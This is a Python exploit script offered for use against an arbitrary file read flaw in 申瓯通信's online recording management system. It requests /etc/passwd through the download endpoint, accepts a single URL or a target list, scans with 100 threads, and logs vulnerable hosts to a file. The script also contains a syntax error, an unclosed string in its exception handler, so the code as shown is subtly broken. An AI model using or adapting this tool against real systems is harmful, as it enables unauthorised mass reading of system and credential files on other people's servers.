import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    banner = """
    <<<<<<<<申瓯通信 在线录音管理系统 download 任意文件读取漏洞>>>>>>>>           
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='申瓯通信 在线录音管理系统 download 任意文件读取漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):

    url = target+'/main/download?path=/etc/passwd'
    headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "keep-alive"
        }
    try:
        res = requests.get(url,headers=headers,verify=False,timeout=5)
        if res.status_code == 200 and 'root' in res.text :
            print(f"[+]该url{target}存在远程任意文件读取漏洞")
            with open("success.txt", "a+", encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            print(f"[-]该url{target}不存在任意文件读取漏洞")
    except Exception as e:
        print(f"[*] 该url出现错误:{target})

if __name__ == '__main__':
    main()